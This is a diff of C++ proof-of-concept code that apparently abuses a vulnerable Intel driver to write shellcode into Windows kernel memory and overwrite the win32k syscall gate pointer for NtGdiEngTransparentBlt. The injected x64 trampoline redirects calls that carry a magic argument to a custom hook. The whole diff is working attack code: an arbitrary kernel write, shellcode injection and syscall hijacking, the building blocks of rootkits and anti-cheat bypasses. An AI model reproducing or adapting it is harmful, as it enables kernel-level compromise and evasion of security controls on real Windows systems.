@@ -20,9 +20,25 @@ namespace offset
 	}
 }
 
-unsigned char R0_Callgate_Buf[2] = { 0xCC, 0xC3 };
-// int 3h
-// ret
+unsigned char R0_Callgate_Buf[] =
+{
+	/* 0*/ 0x48, 0xB8, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13,	// movabs rax,0x1337133713371337
+	/*10*/ 0x48, 0x39, 0xC1,											// cmp    rcx,rax
+	/*13*/ 0x74, 0x0C,													// je     +12 <is_hooked_thread>	// 15 + 12 = 27
+	/*15*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs rax,0x1122334455667788
+	/*25*/ 0xFF, 0xE0,													// jmp    rax
+	/*27*/																// <is_hooked_thread>:
+	/*27*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs rax,0x1122334455667788
+	/*37*/ 0xFF, 0xE0													// jmp    rax
+};
+constexpr unsigned R0_Callgate_Orig = 15 + 2;
+constexpr unsigned R0_Callgate_Hook = 27 + 2;
+unsigned char R0_Hook_Buf[] =
+{
+	/*0xCC,										// int 3*/
+	0x48, 0xC7, 0xC0, 0xA4, 0x01, 0x00, 0x00,	// mov    rax, 420
+	0xC3										// ret
+};
 
 int main(const int argc, char* argv[])
 {
@@ -44,14 +60,6 @@ int main(const int argc, char* argv[])
 	const auto SyscallID = *static_cast<PDWORD>(ptr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_SyscallID, NtGdiEngTransparentBlt));
 	printf("R3 SyscallID = %lx" "\n", SyscallID);
 	if (!SyscallID) return 0;
-
-	const auto teb = NtCurrentTeb();
-	printf("R3 teb = %p" "\n", teb);
-	if (!teb) return 0;
-	
-	const auto GdiBatchCount = ptr_field(offset::_TEB::GdiBatchCount, teb);
-	printf("R3 GdiBatchCount = %p" "\n", GdiBatchCount);
-	if (!GdiBatchCount) return 0;
 
 	// Find win32k.sys Modul-Base
 	const auto win32k = reinterpret_cast<void*>(utils::GetKernelModuleAddress("win32k.sys"));
@@ -112,20 +120,34 @@ int main(const int argc, char* argv[])
 	printf("R0 NtGdiEngTransparentBlt RIP GATE = %llx" "\n", R0_NtBlt_RIP_GATE);
 	if (!R0_NtBlt_RIP_GATE) return Unload(hDev);
 	
-	printf(" > Allocate/Write Shellcode" "\n");
+	printf(" > Allocate Shellcode" "\n");
 	
 	// Allocate Kernel-Memory
 	auto R0_Callgate_PTR = intel_driver::AllocatePool(hDev,
 		nt::POOL_TYPE::NonPagedPool,
-		sizeof(R0_Callgate_Buf));
+		sizeof(R0_Callgate_Buf) + sizeof(R0_Hook_Buf));
 	if (!R0_Callgate_PTR) return Unload(hDev);
+	auto R0_Hook_PTR = R0_Callgate_PTR + sizeof(R0_Callgate_Buf);
+	printf("R0 Trampolin-Shellcode PTR = %llx" "\n", R0_Callgate_PTR);
+	printf("R0 Hook-Shellcode PTR = %llx" "\n", R0_Hook_PTR);
 
+	printf(" > Write Hook Shellcode" "\n");
+	// Write Hook-Shellcode to allocated Kernel-Memory
+	if (!intel_driver::WriteMemory(hDev,
+		R0_Hook_PTR,
+		R0_Hook_Buf,
+		sizeof(R0_Hook_Buf))) return Unload(hDev);
+
+	// Edit Shellcode
+	memcpy(&R0_Callgate_Buf[R0_Callgate_Orig], &R0_NtBlt_RIP_GATE, sizeof(R0_NtBlt_RIP_GATE));
+	memcpy(&R0_Callgate_Buf[R0_Callgate_Hook], &R0_Hook_PTR, sizeof(R0_Hook_PTR));
+
+	printf(" > Write Trampolin-Shellcode" "\n");
 	// Write Shellcode to allocated Kernel-Memory
 	if (!intel_driver::WriteMemory(hDev,
 		R0_Callgate_PTR,
 		R0_Callgate_Buf,
 		sizeof(R0_Callgate_Buf))) return Unload(hDev);
-	printf("R0 Shellcode = %llx" "\n", R0_Callgate_PTR);
 
 	printf(" > Overwrite Gate Pointer" "\n");
 	
@@ -135,23 +157,36 @@ int main(const int argc, char* argv[])
 		static_cast<void*>(&R0_Callgate_PTR),
 		sizeof(uint64_t))) return Unload(hDev);
 
-	printf(" > Call GDI-Syscall" "\n");
-	Sleep(1000);
-	
-	if (const auto p = static_cast<unsigned int*>(GdiBatchCount); (*p) == 0)
-	{
-		(*p) = 1337;
+	//const auto teb = NtCurrentTeb();
+	//printf("R3 teb = %p" "\n", teb);
+	//if (!teb) return 0;
+	//const auto GdiBatchCount = ptr_field(offset::_TEB::GdiBatchCount, teb);
+	//printf("R3 GdiBatchCount = %p" "\n", GdiBatchCount);
+	//if (!GdiBatchCount) return 0;
+	//if (const auto p = static_cast<unsigned int*>(GdiBatchCount); (*p) == 0)
+	//{
+	//	(*p) = 1337;
+	//	//call
+	//	(*p) = 0;
+	//}
+	printf(" > Call GDI-Syscall (Hooked)" "\n");
+	printf(" + RETVAL: %llu" "\n", static_cast<int64_t(*)(
+		int64_t _rcx, int64_t _rdx, int64_t _r8, int64_t _r9,
+		int64_t _ebp_16, int64_t _ebp_24,
+		int32_t _ebp_32, int32_t _ebp_36)>(NtGdiEngTransparentBlt)(
+			0x1337133713371337, 2, 3, 4,
+			5, 6,
+			7, 8));
 
-		static_cast<int64_t(*)(
-			int64_t _rcx, int64_t _rdx, int64_t _r8, int64_t _r9,
-			int64_t _ebp_16, int64_t _ebp_24,
-			int32_t _ebp_32, int32_t _ebp_36)>(NtGdiEngTransparentBlt)(
-				1, 2, 3, 4,
-				5, 6,
-				7, 8);
-
-		(*p) = 0;
-	}
+	printf(" > Call GDI-Syscall (Without Hook)" "\n");
+	auto retval = 
+	printf(" + RETVAL: %llu" "\n", static_cast<int64_t(*)(
+		int64_t _rcx, int64_t _rdx, int64_t _r8, int64_t _r9,
+		int64_t _ebp_16, int64_t _ebp_24,
+		int32_t _ebp_32, int32_t _ebp_36)>(NtGdiEngTransparentBlt)(
+			1, 2, 3, 4,
+			5, 6,
+			7, 8));
 
 	printf(" > Reset Gate Pointer" "\n");
 
